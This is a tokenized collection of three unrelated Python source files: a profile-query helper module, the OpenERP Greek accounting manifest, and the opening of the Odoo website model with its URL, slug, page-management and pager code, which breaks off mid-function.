w.r.t ▁ :pkey:`resources` <strnewline> ▁ :param ▁ str ▁ resource_key: ▁ the ▁ resources ▁ key ▁ identifier ▁ whose ▁ unique ▁ values <strnewline> ▁ will ▁ be ▁ iterated <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ all ▁ resource ▁ key ▁ values <strnewline> ▁ """  <newline>  # ▁ Convert ▁ the ▁ key ▁ identifier ▁ to ▁ iterable ▁ hierarchy <encdom> key_hierarchy = resource_key . split ( ":" ) <newline>  # ▁ Iterate ▁ the ▁ hierarchy <encdom> for level_idx , key_level in enumerate ( key_hierarchy ) : <newline> <indent> if key_level == '' and isinstance ( resource , ( list , set ) ) : <newline>  # ▁ The ▁ level ▁ is ▁ list, ▁ iterate ▁ all ▁ the ▁ members ▁ recursively <encdom> <indent> for item in resource : <newline> <indent> for result in all_key_values_of ( item , ':' . join ( key_hierarchy [ level_idx + 1 : ] ) ) : <newline> <indent> yield result <newline> <dedent> <dedent> return <newline> <dedent> elif key_level in resource : <newline>  # ▁ The ▁ level ▁ is ▁ dict, ▁ find ▁ key <encdom> <indent> resource = resource [ key_level ] <newline> <dedent> else : <newline>  # ▁ No ▁ match <encdom> <indent> return <newline> <dedent> <dedent> yield resource <newline> <dedent> def unique_model_values_of ( profile , model_key ) : <newline> <indent>  """ Generator ▁ of ▁ all ▁ unique ▁ key ▁ values ▁ occurring ▁ in ▁ the ▁ models ▁ in ▁ the <strnewline> ▁ resources ▁ of ▁ given ▁ performance ▁ profile ▁ w.r.t. ▁ :ref:`profile-spec`. <strnewline> <strnewline> ▁ Iterates ▁ through ▁ all ▁ of ▁ the ▁ values ▁ of ▁ given ▁ ``resource_keys`` ▁ and ▁ yields <strnewline> ▁ only ▁ unique ▁ values. ▁ Note ▁ that ▁ the ▁ key ▁ can ▁ contain ▁':' ▁ symbol ▁ indicating <strnewline> ▁ another ▁ level ▁ of ▁ dictionary ▁ hierarchy ▁ or ▁'::' ▁ for ▁ specifying ▁ keys ▁ in ▁ list <strnewline> ▁ or ▁ set ▁ level, ▁ e.g. ▁ in ▁ case ▁ of ▁ `traces` ▁ one ▁ uses ▁ ``trace::function``. ▁ For <strnewline> ▁ more ▁ details ▁ about ▁ the ▁ specification ▁ of ▁ models ▁ refer ▁ to ▁ :pkey:`models` ▁ or <strnewline> ▁ :ref:`postprocessors-regression-analysis`). <strnewline> <strnewline> ▁ E.g. ▁ given ▁ some ▁ trace ▁ profile ▁ ``complexity_prof``, ▁ we ▁ can ▁ obtain <strnewline> ▁ unique ▁ values ▁ of ▁ keys ▁ from ▁ `models` ▁ as ▁ follows: <strnewline> <strnewline> ▁ >>> ▁ list(query.unique_model_values_of('model') <strnewline> ▁ ['constant', ▁'exponential', ▁'linear', ▁'logarithmic', ▁'quadratic'] <strnewline> ▁ >>> ▁ list(query.unique_model_values_of('r_square')) <strnewline> ▁ [0.0, ▁ 0.007076437903106431, ▁ 0.0017560012128507133, <strnewline> ▁ 0.0008704119815403224, ▁ 0.003480627284909902, ▁ 0.001977866710139782, <strnewline> ▁ 0.8391363620083871, ▁ 0.9840099999298596, ▁ 0.7283427343995424, <strnewline> ▁ 0.9709120064750161, ▁ 0.9305786182556899] <strnewline> <strnewline> ▁ :param ▁ Profile ▁ profile: ▁ performance ▁ profile ▁ w.r.t ▁ :ref:`profile-spec` <strnewline> ▁ :param ▁ str ▁ model_key: ▁ key ▁ identifier ▁ from ▁ `models` ▁ for ▁ which ▁ we ▁ query <strnewline> ▁ its ▁ unique ▁ values <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ unique ▁ model ▁ key ▁ values <strnewline> ▁ """  <newline> for value in _unique_values_generator ( model_key , profile . all_models ) : <newline> <indent> yield value <newline> <dedent> <dedent> def _unique_values_generator ( key , blocks_gen ) : <newline> <indent>  """ Generator ▁ of ▁ all ▁ unique ▁ values ▁ of ▁'key' ▁ occurring ▁ in ▁ the ▁ profile ▁ blocks ▁ generated ▁ by <strnewline> ▁'blocks_gen'. <strnewline> <strnewline> ▁ :param ▁ dict ▁ profile: ▁ valid ▁ profile ▁ with ▁ models <strnewline> ▁ :param ▁ str ▁ key: ▁ the ▁ key ▁ identifier ▁ whose ▁ unique ▁ values ▁ are ▁ returned <strnewline> ▁ :param ▁ iterable ▁ blocks_gen: ▁ the ▁ data ▁ blocks ▁ generator ▁ (e.g. ▁ all_resources ▁ of ▁ Profile) <strnewline> ▁ :returns ▁ iterable: ▁ stream ▁ of ▁ unique ▁ key ▁ values <strnewline> ▁ """  <newline>  # ▁ value ▁ can ▁ be ▁ dict, ▁ list, ▁ set ▁ etc ▁ and ▁ not ▁ only ▁ simple ▁ type, ▁ thus ▁ the ▁ list <encdom> unique_values = list ( ) <newline> for ( _ , resource ) in blocks_gen ( ) : <newline>  # ▁ Get ▁ all ▁ values ▁ the ▁ key ▁ contains <encdom> <indent> for value in all_key_values_of ( resource , key ) : <newline>  # ▁ Return ▁ only ▁ the ▁ unique ▁ ones <encdom> <indent> if value not in unique_values : <newline> <indent> unique_values . append ( value ) <newline> yield value <newline> <dedent> <dedent> <dedent> <dedent>
 # ▁ -*- ▁ encoding: ▁ utf-8 ▁ -*- <encdom>  # ▁ OpenERP, ▁ Open ▁ Source ▁ Management ▁ Solution <encdom>  # ▁ Copyright ▁ (C) ▁ 2009 ▁ P. ▁ Christeas ▁ <p_christ@hol.gr>. ▁ All ▁ Rights ▁ Reserved <encdom>  # ▁ $Id$ <encdom>  # ▁ This ▁ program ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ as ▁ published ▁ by <encdom>  # ▁ the ▁ Free ▁ Software ▁ Foundation, ▁ either ▁ version ▁ 3 ▁ of ▁ the ▁ License, ▁ or <encdom>  # ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <encdom>  # ▁ This ▁ program ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <encdom>  # ▁ GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ this ▁ program. ▁ If ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <encdom> { 'name' : 'Greece ▁ - ▁ Accounting' , 'version' : '0.2' , 'author' : 'P. ▁ Christeas, ▁ OpenERP ▁ SA.' , 'website' : 'http://openerp.hellug.gr/' , 'category' : 'Localization/Account ▁ Charts' , 'description' :  """ <strnewline> This ▁ is ▁ the ▁ base ▁ module ▁ to ▁ manage ▁ the ▁ accounting ▁ chart ▁ for ▁ Greece. <strnewline> ================================================================== <strnewline> <strnewline> Greek ▁ accounting ▁ chart ▁ and ▁ localization. <strnewline> ▁ ▁ ▁ ▁ """  , 'depends' : [ 'base' , 'account' , 'base_iban' , 'base_vat' , 'account_chart' ] , 'demo' : [ ] , 'data' : [ 'account_types.xml' , 'account_chart.xml' , 'account_full_chart.xml' , 'account_tax.xml' , 'account_tax_vat.xml' , 'l10n_gr_wizard.xml' ] , 'installable' : True , 'images' : [ 'images/config_chart_l10n_gr.jpeg' , 'images/l10n_gr_chart.jpeg' ] , } <newline>  # ▁ vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4: <encdom>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom> import inspect <newline> import logging <newline> import math <newline> import unicodedata <newline> import re <newline> import urlparse <newline> import hashlib <newline> from sys import maxint <newline> import werkzeug <newline>  # ▁ optional ▁ python-slugify ▁ import ▁ (https://github.com/un33k/python-slugify) <encdom> try : <newline> <indent> import slugify as slugify_lib <newline> <dedent> except ImportError : <newline> <indent> slugify_lib = None <newline> <dedent> import openerp <newline> from openerp . tools . translate import _ <newline> from openerp . osv import orm , osv , fields <newline> from openerp . tools import html_escape as escape , ustr , image_resize_and_sharpen , image_save_for_web <newline> from openerp . tools . safe_eval import safe_eval <newline> from openerp . addons . web . http import request <newline> from werkzeug . exceptions import NotFound <newline> logger = logging . getLogger ( __name__ ) <newline> def url_for ( path_or_uri , lang = None ) : <newline> <indent> if isinstance ( path_or_uri , unicode ) : <newline> <indent> path_or_uri = path_or_uri . encode ( 'utf-8' ) <newline> <dedent> current_path = request . httprequest . path <newline> if isinstance ( current_path , unicode ) : <newline> <indent> current_path = current_path . encode ( 'utf-8' ) <newline> <dedent> location = path_or_uri . strip ( ) <newline> force_lang = lang is not None <newline> url = urlparse . urlparse ( location ) <newline> if request and not url . netloc and not url . scheme and ( url . path or force_lang ) : <newline> <indent> location = urlparse . urljoin ( current_path , location ) <newline> lang = lang or request . context . get ( 'lang' ) <newline> langs = [ lg [ 0 ] for lg in request . website . get_languages ( ) ] <newline> if ( len ( langs ) > 1 or force_lang ) and is_multilang_url ( location , langs ) : <newline> <indent> ps = location . split ( '/' ) <newline> if ps [ 1 ] in langs : <newline>  # ▁ Replace ▁ the ▁ language ▁ only ▁ if ▁ we ▁ explicitly ▁ provide ▁ a ▁ language ▁ to ▁ url_for <encdom> <indent> if force_lang : <newline> <indent> ps [ 1 ] = lang . encode ( 'utf-8' ) <newline>  # ▁ Remove ▁ the ▁ default ▁ language ▁ unless ▁ it's ▁ explicitly ▁ provided <encdom> <dedent> elif ps [ 1 ] == request . website . default_lang_code : <newline> <indent> ps . pop ( 1 ) <newline>  # ▁ Insert ▁ the ▁ context ▁ language ▁ or ▁ the ▁ provided ▁ language <encdom> <dedent> <dedent> elif lang != request . website . default_lang_code or force_lang : <newline> <indent> ps . insert ( 1 , lang . encode ( 'utf-8' ) ) <newline> <dedent> location = '/' . join ( ps ) <newline> <dedent> <dedent> return location . decode ( 'utf-8' ) <newline> <dedent> def is_multilang_url ( local_url , langs = None ) : <newline> <indent> if not langs : <newline> <indent> langs = [ lg [ 0 ] for lg in request . website . get_languages ( ) ] <newline> <dedent> spath = local_url . split ( '/' ) <newline>  # ▁ if ▁ a ▁ language ▁ is ▁ already ▁ in ▁ the ▁ path, ▁ remove ▁ it <encdom> if spath [ 1 ] in langs : <newline> <indent> spath . pop ( 1 ) <newline> local_url = '/' . join ( spath ) <newline> <dedent> try : <newline>  # ▁ Try ▁ to ▁ match ▁ an ▁ endpoint ▁ in ▁ werkzeug's ▁ routing ▁ table <encdom> <indent> url = local_url . split ( '?' ) <newline> path = url [ 0 ] <newline> query_string = url [ 1 ] if len ( url ) > 1 else None <newline> router = request . httprequest . app . get_db_router ( request . db ) . bind ( '' ) <newline>  # ▁ Force ▁ to ▁ check ▁ method ▁ to ▁ POST. ▁ Odoo ▁ uses ▁ methods ▁ : ▁ ['POST'] ▁ and ▁ ['GET', ▁'POST'] <encdom> func = router . match ( path , method = 'POST' , query_args = query_string ) [ 0 ] <newline> return ( func . routing . get ( 'website' , False ) and func . routing . get ( 'multilang' , func . routing [ 'type' ] == 'http' ) ) <newline> <dedent> except Exception : <newline> <indent> return False <newline> <dedent> <dedent> def slugify ( s , max_length = None ) : <newline> <indent>  """ ▁ Transform ▁ a ▁ string ▁ to ▁ a ▁ slug ▁ that ▁ can ▁ be ▁ used ▁ in ▁ a ▁ url ▁ path. <strnewline> <strnewline> ▁ This ▁ method ▁ will ▁ first ▁ try ▁ to ▁ do ▁ the ▁ job ▁ with ▁ python-slugify ▁ if ▁ present. <strnewline> ▁ Otherwise ▁ it ▁ will ▁ process ▁ string ▁ by ▁ stripping ▁ leading ▁ and ▁ ending ▁ spaces, <strnewline> ▁ converting ▁ unicode ▁ chars ▁ to ▁ ascii, ▁ lowering ▁ all ▁ chars ▁ and ▁ replacing ▁ spaces <strnewline> ▁ and ▁ underscore ▁ with ▁ hyphen ▁"-". <strnewline> <strnewline> ▁ :param ▁ s: ▁ str <strnewline> ▁ :param ▁ max_length: ▁ int <strnewline> ▁ :rtype: ▁ str <strnewline> ▁ """  <newline> s = ustr ( s ) <newline> if slugify_lib : <newline>  # ▁ There ▁ are ▁ 2 ▁ different ▁ libraries ▁ only ▁ python-slugify ▁ is ▁ supported <encdom> <indent> try : <newline> <indent> return slugify_lib . slugify ( s , max_length = max_length ) <newline> <dedent> except TypeError : <newline> <indent> pass <newline> <dedent> <dedent> uni = unicodedata . normalize ( 'NFKD' , s ) . encode ( 'ascii' , 'ignore' ) . decode ( 'ascii' ) <newline> slug = re . sub ( '[\W_]' , ' ▁ ' , uni ) . strip ( ) . lower ( ) <newline> slug = re . sub ( '[-\s]+' , '-' , slug ) <newline> return slug [ : max_length ] <newline> <dedent> def slug ( value ) : <newline> <indent> if isinstance ( value , orm . browse_record ) : <newline>  # ▁ [(id, ▁ name)] ▁ = ▁ value.name_get() <encdom> <indent> id , name = value . id , value . display_name <newline> <dedent> else : <newline>  # ▁ assume ▁ name_search ▁ result ▁ tuple <encdom> <indent> id , name = value <newline> <dedent> slugname = slugify ( name or '' ) . strip ( ) . strip ( '-' ) <newline> if not slugname : <newline> <indent> return str ( id ) <newline> <dedent> return "%s-%d" % ( slugname , id ) <newline>  # ▁ NOTE: ▁ as ▁ the ▁ pattern ▁ is ▁ used ▁ as ▁ it ▁ for ▁ the ▁ ModelConverter ▁ (ir_http.py), ▁ do ▁ not ▁ use ▁ any ▁ flags <encdom> <dedent> _UNSLUG_RE = re . compile ( r'(?:(\w{1,2}|\w[A-Za-z0-9-_]+?\w)-)?(-?\d+)(?=$|/)' ) <newline> DEFAULT_CDN_FILTERS = [ "^/[^/]+/static/" , "^/web/(css|js)/" , "^/web/image" , "^/web/content" ,  # ▁ retrocompatibility <encdom> "^/website/image/" , ] <newline> def unslug ( s ) : <newline> <indent>  """ Extract ▁ slug ▁ and ▁ id ▁ from ▁ a ▁ string. <strnewline> ▁ Always ▁ return ▁ un ▁ 2-tuple ▁ (str|None, ▁ int|None) <strnewline> ▁ """  <newline> m = _UNSLUG_RE . match ( s ) <newline> if not m : <newline> <indent> return None , None <newline> <dedent> return m . group ( 1 ) , int ( m . group ( 2 ) ) <newline> <dedent> def urlplus ( url , params ) : <newline> <indent> return werkzeug . Href ( url ) ( params or None ) <newline> <dedent> class website ( osv . osv ) : <newline> <indent> def _get_menu ( self , cr , uid , ids , name , arg , context = None ) : <newline> <indent> res = { } <newline> menu_obj = self . pool . get ( 'website.menu' ) <newline> for id in ids : <newline> <indent> menu_ids = menu_obj . search ( cr , uid , [ ( 'parent_id' , '=' , False ) , ( 'website_id' , '=' , id ) ] , order = 'id' , context = context ) <newline> res [ id ] = menu_ids and menu_ids [ 0 ] or False <newline> <dedent> return res <newline> <dedent> _name = "website"  # ▁ Avoid ▁ website.website ▁ convention ▁ for ▁ conciseness ▁ (for ▁ new ▁ api). ▁ Got ▁ a ▁ special ▁ authorization ▁ from ▁ xmo ▁ and ▁ rco <encdom> <newline> _description = "Website" <newline> _columns = { 'name' : fields . char ( 'Website ▁ Name' ) , 'domain' : fields . char ( 'Website ▁ Domain' ) , 'company_id' : fields . many2one ( 'res.company' , string = "Company" ) , 'language_ids' : fields . many2many ( 'res.lang' , 'website_lang_rel' , 'website_id' , 'lang_id' , 'Languages' ) , 'default_lang_id' : fields . many2one ( 'res.lang' , string = "Default ▁ language" ) , 'default_lang_code' : fields . related ( 'default_lang_id' , 'code' , type = "char" , string = "Default ▁ language ▁ code" , store = True ) , 'social_twitter' : fields . char ( 'Twitter ▁ Account' ) , 'social_facebook' : fields . char ( 'Facebook ▁ Account' ) , 'social_github' : fields . char ( 'GitHub ▁ Account' ) , 'social_linkedin' : fields . char ( 'LinkedIn ▁ Account' ) , 'social_youtube' : fields . char ( 'Youtube ▁ Account' ) , 'social_googleplus' : fields . char ( 'Google+ ▁ Account' ) , 'google_analytics_key' : fields . char ( 'Google ▁ Analytics ▁ Key' ) , 'user_id' : fields . many2one ( 'res.users' , string = 'Public ▁ User' ) , 'compress_html' : fields . boolean ( 'Compress ▁ HTML' ) , 'cdn_activated' : fields . boolean ( 'Activate ▁ CDN ▁ for ▁ assets' ) , 'cdn_url' : fields . char ( 'CDN ▁ Base ▁ URL' ) , 'cdn_filters' : fields . text ( 'CDN ▁ Filters' , help = "URL ▁ matching ▁ those ▁ filters ▁ will ▁ be ▁ rewritten ▁ using ▁ the ▁ CDN ▁ Base ▁ URL" ) , 'partner_id' : fields . related ( 'user_id' , 'partner_id' , type = 'many2one' , relation = 'res.partner' , string = 'Public ▁ Partner' ) , 'menu_id' : fields . function ( _get_menu , relation = 'website.menu' , type = 'many2one' , string = 'Main ▁ Menu' ) } <newline> _defaults = { 'user_id' : lambda self , cr , uid , c : self . pool [ 'ir.model.data' ] . xmlid_to_res_id ( cr , openerp . SUPERUSER_ID , 'base.public_user' ) , 'company_id' : lambda self , cr , uid , c : self . pool [ 'ir.model.data' ] . xmlid_to_res_id ( cr , openerp . SUPERUSER_ID , 'base.main_company' ) , 'compress_html' : False , 'cdn_activated' : False , 'cdn_url' : '' , 'cdn_filters' : ' \n ' . join ( DEFAULT_CDN_FILTERS ) , } <newline>  # ▁ cf. ▁ Wizard ▁ hack ▁ in ▁ website_views.xml <encdom> def noop ( self , * args , ** kwargs ) : <newline> <indent> pass <newline> <dedent> def write ( self , cr , uid , ids , vals , context = None ) : <newline> <indent> self . _get_languages . clear_cache ( self ) <newline> return super ( website , self ) . write ( cr , uid , ids , vals , context ) <newline> <dedent> def new_page ( self , cr , uid , name , template = 'website.default_page' , ispage = True , context = None ) : <newline> <indent> context = context or { } <newline> imd = self . pool . get ( 'ir.model.data' ) <newline> view = self . pool . get ( 'ir.ui.view' ) <newline> template_module , template_name = template . split ( '.' ) <newline>  # ▁ completely ▁ arbitrary ▁ max_length <encdom> page_name = slugify ( name , max_length = 50 ) <newline> page_xmlid = "%s.%s" % ( template_module , page_name ) <newline>  # ▁ find ▁ a ▁ free ▁ xmlid <encdom> inc = 0 <newline> dom = [ ( 'website_id' , '=' , False ) , ( 'website_id' , '=' , context . get ( 'website_id' ) ) ] <newline> while view . search ( cr , openerp . SUPERUSER_ID , [ ( 'key' , '=' , page_xmlid ) , '|' ] + dom , context = dict ( context or { } , active_test = False ) ) : <newline> <indent> inc += 1 <newline> page_xmlid = "%s.%s" % ( template_module , page_name + ( inc and "-%s" % inc or "" ) ) <newline> <dedent> page_name += ( inc and "-%s" % inc or "" ) <newline>  # ▁ new ▁ page <encdom> _ , template_id = imd . get_object_reference ( cr , uid , template_module , template_name ) <newline> website_id = context . get ( 'website_id' ) <newline> key = template_module + '.' + page_name <newline> page_id = view . copy ( cr , uid , template_id , { 'website_id' : website_id , 'key' : key } , context = context ) <newline> page = view . browse ( cr , uid , page_id , context = dict ( context , lang = None ) ) <newline> page . write ( { 'arch' : page . arch . replace ( template , page_xmlid ) , 'name' : page_name , 'page' : ispage , } ) <newline> return page_xmlid <newline> <dedent> def key_to_view_id ( self , cr , uid , view_id , context = None ) : <newline> <indent> View = self . pool . get ( 'ir.ui.view' ) <newline> return View . search ( cr , uid , [ ( 'id' , '=' , view_id ) , "|" , ( 'website_id' , '=' , context . get ( 'website_id' ) ) , ( 'website_id' , '=' , False ) , ( 'page' , '=' , True ) , ( 'type' , '=' , 'qweb' ) ] , context = context ) <newline> <dedent> def delete_page ( self , cr , uid , view_id , context = None ) : <newline> <indent> if context is None : <newline> <indent> context = { } <newline> <dedent> View = self . pool . get ( 'ir.ui.view' ) <newline> view_find = self . key_to_view_id ( cr , uid , view_id , context = context ) <newline> if view_find : <newline> <indent> View . unlink ( cr , uid , view_find , context = context ) <newline> <dedent> <dedent> def rename_page ( self , cr , uid , view_id , new_name , context = None ) : <newline> <indent> if context is None : <newline> <indent> context = { } <newline> <dedent> View = self . pool . get ( 'ir.ui.view' ) <newline> view_find = self . key_to_view_id ( cr , uid , view_id , context = context ) <newline> if view_find : <newline> <indent> v = View . browse ( cr , uid , view_find , context = context ) <newline> new_name = slugify ( new_name , max_length = 50 ) <newline>  # ▁ Prefix ▁ by ▁ module ▁ if ▁ not ▁ already ▁ done ▁ by ▁ end ▁ user <encdom> prefix = v . key . split ( '.' ) [ 0 ] <newline> if not new_name . startswith ( prefix ) : <newline> <indent> new_name = "%s.%s" % ( prefix , new_name ) <newline> <dedent> View . write ( cr , uid , view_find , { 'key' : new_name , 'arch_db' : v . arch_db . replace ( v . key , new_name , 1 ) } ) <newline> return new_name <newline> <dedent> <dedent> def page_search_dependencies ( self , cr , uid , view_id = False , context = None ) : <newline> <indent> dep = { } <newline> if not view_id : <newline> <indent> return dep <newline>  # ▁ search ▁ dependencies ▁ just ▁ for ▁ information. <encdom>  # ▁ It ▁ will ▁ not ▁ catch ▁ 100% ▁ of ▁ dependencies ▁ and ▁ False ▁ positive ▁ is ▁ more ▁ than ▁ possible <encdom>  # ▁ Each ▁ module ▁ could ▁ add ▁ dependences ▁ in ▁ this ▁ dict <encdom> <dedent> if context is None : <newline> <indent> context = { } <newline> <dedent> View = self . pool . get ( 'ir.ui.view' ) <newline> Menu = self . pool . get ( 'website.menu' ) <newline> view = View . browse ( cr , uid , view_id , context = context ) <newline> website_id = context . get ( 'website_id' ) <newline> name = view . key . replace ( "website." , "" ) <newline> fullname = "website.%s" % name <newline> if view . page : <newline>  # ▁ search ▁ for ▁ page ▁ with ▁ link <encdom> <indent> page_search_dom = [ '|' , ( 'website_id' , '=' , website_id ) , ( 'website_id' , '=' , False ) , '|' , ( 'arch_db' , 'ilike' , '/page/%s' % name ) , ( 'arch_db' , 'ilike' , '/page/%s' % fullname ) ] <newline> pages = View . search ( cr , uid , page_search_dom , context = context ) <newline> if pages : <newline> <indent> page_key = _ ( 'Page' ) <newline> dep [ page_key ] = [ ] <newline> <dedent> for page in View . browse ( cr , uid , pages , context = context ) : <newline> <indent> if page . page : <newline> <indent> dep [ page_key ] . append ( { 'text' : _ ( 'Page ▁ <b>%s</b> ▁ seems ▁ to ▁ have ▁ a ▁ link ▁ to ▁ this ▁ page ▁ !' ) % page . key , 'link' : '/page/%s' % page . key } ) <newline> <dedent> else : <newline> <indent> dep [ page_key ] . append ( { 'text' : _ ( 'Template ▁ <b>%s ▁ (id:%s)</b> ▁ seems ▁ to ▁ have ▁ a ▁ link ▁ to ▁ this ▁ page ▁ !' ) % ( page . key , page . id ) , 'link' : ' # ' } ) <newline>  # ▁ search ▁ for ▁ menu ▁ with ▁ link <encdom> <dedent> <dedent> menu_search_dom = [ '|' , ( 'website_id' , '=' , website_id ) , ( 'website_id' , '=' , False ) , '|' , ( 'url' , 'ilike' , '/page/%s' % name ) , ( 'url' , 'ilike' , '/page/%s' % fullname ) ] <newline> menus = Menu . search ( cr , uid , menu_search_dom , context = context ) <newline> if menus : <newline> <indent> menu_key = _ ( 'Menu' ) <newline> dep [ menu_key ] = [ ] <newline> <dedent> for menu in Menu . browse ( cr , uid , menus , context = context ) : <newline> <indent> dep [ menu_key ] . append ( { 'text' : _ ( 'Menu ▁ <b>%s</b> ▁ seems ▁ to ▁ have ▁ a ▁ link ▁ to ▁ this ▁ page ▁ !' ) % menu . name , 'link' : False } ) <newline> <dedent> <dedent> return dep <newline> <dedent> def page_for_name ( self , cr , uid , ids , name , module = 'website' , context = None ) : <newline>  # ▁ whatever <encdom> <indent> return '%s.%s' % ( module , slugify ( name , max_length = 50 ) ) <newline> <dedent> def page_exists ( self , cr , uid , ids , name , module = 'website' , context = None ) : <newline> <indent> try : <newline> <indent> name = ( name or "" ) . replace ( "/page/website." , "" ) . replace ( "/page/" , "" ) <newline> if not name : <newline> <indent> return False <newline> <dedent> return self . pool [ "ir.model.data" ] . get_object_reference ( cr , uid , module , name ) <newline> <dedent> except : <newline> <indent> return False <newline> <dedent> <dedent> @ openerp . tools . ormcache ( 'id' ) <newline> def _get_languages ( self , cr , uid , id , context = None ) : <newline> <indent> website = self . browse ( cr , uid , id ) <newline> return [ ( lg . code , lg . name ) for lg in website . language_ids ] <newline> <dedent> def get_cdn_url ( self , cr , uid , uri , context = None ) : <newline>  # ▁ Currently ▁ only ▁ usable ▁ in ▁ a ▁ website_enable ▁ request ▁ context <encdom> <indent> if request and request . website and not request . debug and request . website . user_id . id == request . uid : <newline> <indent> cdn_url = request . website . cdn_url <newline> cdn_filters = ( request . website . cdn_filters or '' ) . splitlines ( ) <newline> for flt in cdn_filters : <newline> <indent> if flt and re . match ( flt , uri ) : <newline> <indent> return urlparse . urljoin ( cdn_url , uri ) <newline> <dedent> <dedent> <dedent> return uri <newline> <dedent> def get_languages ( self , cr , uid , ids , context = None ) : <newline> <indent> return self . _get_languages ( cr , uid , ids [ 0 ] ) <newline> <dedent> def get_alternate_languages ( self , cr , uid , ids , req = None , context = None ) : <newline> <indent> langs = [ ] <newline> if req is None : <newline> <indent> req = request . httprequest <newline> <dedent> default = self . get_current_website ( cr , uid , context = context ) . default_lang_code <newline> shorts = [ ] <newline> def get_url_localized ( router , lang ) : <newline> <indent> arguments = dict ( request . endpoint_arguments ) <newline> for k , v in arguments . items ( ) : <newline> <indent> if isinstance ( v , orm . browse_record ) : <newline> <indent> arguments [ k ] = v . with_context ( lang = lang ) <newline> <dedent> <dedent> return router . build ( request . endpoint , arguments ) <newline> <dedent> router = request . httprequest . app . get_db_router ( request . db ) . bind ( '' ) <newline> for code , name in self . get_languages ( cr , uid , ids , context = context ) : <newline> <indent> lg_path = ( '/' + code ) if code != default else '' <newline> lg = code . split ( '_' ) <newline> shorts . append ( lg [ 0 ] ) <newline> uri = request . endpoint and get_url_localized ( router , code ) or request . httprequest . path <newline> if req . query_string : <newline> <indent> uri += '?' + req . query_string <newline> <dedent> lang = { 'hreflang' : ( '-' . join ( lg ) ) . lower ( ) , 'short' : lg [ 0 ] , 'href' : req . url_root [ 0 : - 1 ] + lg_path + uri , } <newline> langs . append ( lang ) <newline> <dedent> for lang in langs : <newline> <indent> if shorts . count ( lang [ 'short' ] ) == 1 : <newline> <indent> lang [ 'hreflang' ] = lang [ 'short' ] <newline> <dedent> <dedent> return langs <newline> <dedent> @ openerp . tools . ormcache ( 'domain_name' ) <newline> def _get_current_website_id ( self , cr , uid , domain_name , context = None ) : <newline> <indent> ids = self . search ( cr , uid , [ ( 'domain' , '=' , domain_name ) ] , limit = 1 , context = context ) <newline> return ids and ids [ 0 ] or self . search ( cr , uid , [ ] , limit = 1 ) [ 0 ] <newline> <dedent> def get_current_website ( self , cr , uid , context = None ) : <newline> <indent> domain_name = request . httprequest . environ . get ( 'HTTP_HOST' , '' ) . split ( ':' ) [ 0 ] <newline> website_id = self . _get_current_website_id ( cr , uid , domain_name ) <newline> request . context [ 'website_id' ] = website_id <newline> return self . browse ( cr , uid , website_id , context = context ) <newline> <dedent> def is_publisher ( self , cr , uid , ids , context = None ) : <newline> <indent> Access = self . pool [ 'ir.model.access' ] <newline> is_website_publisher = Access . check ( cr , uid , 'ir.ui.view' , 'write' , False , context = context ) <newline> return is_website_publisher <newline> <dedent> def is_user ( self , cr , uid , ids , context = None ) : <newline> <indent> Access = self . pool [ 'ir.model.access' ] <newline> return Access . check ( cr , uid , 'ir.ui.menu' , 'read' , False , context = context ) <newline> <dedent> def get_template ( self , cr , uid , ids , template , context = None ) : <newline> <indent> View = self . pool [ 'ir.ui.view' ] <newline> if isinstance ( template , ( int , long ) ) : <newline> <indent> view_id = template <newline> <dedent> else : <newline> <indent> if '.' not in template : <newline> <indent> template = 'website.%s' % template <newline> <dedent> view_id = View . get_view_id ( cr , uid , template , context = context ) <newline> <dedent> if not view_id : <newline> <indent> raise NotFound <newline> <dedent> return View . browse ( cr , uid , view_id , context = context ) <newline> <dedent> def _render ( self , cr , uid , ids , template , values = None , context = None ) : <newline>  # ▁ TODO: ▁ remove ▁ this. ▁ (just ▁ kept ▁ for ▁ backward ▁ api ▁ compatibility ▁ for ▁ saas-3) <encdom> <indent> return self . pool [ 'ir.ui.view' ] . render ( cr , uid , template , values = values , context = context ) <newline> <dedent> def render ( self , cr , uid , ids , template , values = None , status_code = None , context = None ) : <newline>  # ▁ TODO: ▁ remove ▁ this. ▁ (just ▁ kept ▁ for ▁ backward ▁ api ▁ compatibility ▁ for ▁ saas-3) <encdom> <indent> return request . render ( template , values , uid = uid ) <newline> <dedent> def pager ( self , cr , uid , ids , url , total , page = 1 , step = 30 , scope = 5 , url_args = None , context = None ) : <newline>  # ▁ Compute ▁ Pager <encdom> <indent> page_count = int ( math . ceil ( float ( total ) / step ) ) <newline> page = max ( 1 , min ( int ( page if str ( page ) . isdigit ( ) else 1 ) , page_count ) ) <newline> scope -= 1 <newline> pmin = max ( page - int ( math . floor ( scope / 2 ) ) , 1 ) <newline> pmax = min ( pmin + scope , page_count ) <newline> if pmax - pmin < scope : <newline> <indent> pmin = pmax - scope if pmax - scope > 0 else 1 <newline> <dedent> def get_url ( page ) : <newline> <indent> _url = "%s/page/%s" % ( url , page ) if page > 1 else url <newline> if url_args : <newline> <indent> _url = "%s?%s" % ( _url , werkzeug . url_encode ( url_args ) ) <newline> <dedent> return _url <newline> <dedent> return { "page_count" : page_count , "offset" : ( page - 1 ) * step , "page" : { 'url' : get_url ( page ) , 'num' : page } , "page_start" : { 'url' : get_url ( pmin ) , 'num' : pmin } , "page_previous" : { 'url' : get_url ( max ( pmin , page - 1 ) ) , 'num' : max ( pmin , page - 1 ) } , "page_next" : { 'url' : get_url ( min ( pmax , page + 